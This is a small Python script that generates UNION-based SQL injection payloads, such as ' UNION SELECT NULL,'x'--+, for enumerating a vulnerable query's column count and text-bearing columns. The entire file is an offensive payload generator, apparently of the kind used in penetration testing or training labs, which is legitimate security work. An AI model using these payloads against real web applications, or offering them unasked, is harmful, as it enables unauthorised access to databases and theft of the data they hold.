#!/usr/bin/env python3

def generate_sqli_payloads(max_columns, test_char):
    """
    Generates SQL injection payloads with increasing column counts.
    Each payload will have the number of columns equal to its position in the sequence.
    The test_char will be substituted at each position for each length.
    
    Args:
        max_columns (int): Maximum number of columns to test
        test_char (str): Character to substitute for NULL
    
    Returns:
        list: Generated SQL injection payloads
    """
    payloads = []
    
    # Generate payloads for each column count from 1 to max_columns
    for col_count in range(1, max_columns + 1):
        # For each column position in the current count
        for i in range(col_count):
            # Create a list of NULLs with the current column count
            columns = ["NULL"] * col_count
            
            # Substitute test_char for NULL at position i
            columns[i] = f"'{test_char}'"
            
            # Join the columns with commas
            column_str = ",".join(columns)
            
            # Create the final payload
            payload = f"' UNION SELECT {column_str}--+"
            
            payloads.append(payload)
    
    return payloads

def main():
    try:
        # Get user input with the exact prompts specified
        max_columns = int(input("How many iterations: "))
        test_char = input("Character to substitute: ")
        
        if max_columns <= 0:
            print("Number of iterations must be greater than 0")
            return
            
        # Generate payloads
        payloads = generate_sqli_payloads(max_columns, test_char)
        
        # Print payloads
        print("\nGenerated Payloads:")
        print("-------------------")
        for payload in payloads:
            print(payload)
            
    except ValueError:
        print("Please enter a valid number for iterations")

if __name__ == "__main__":
    main()
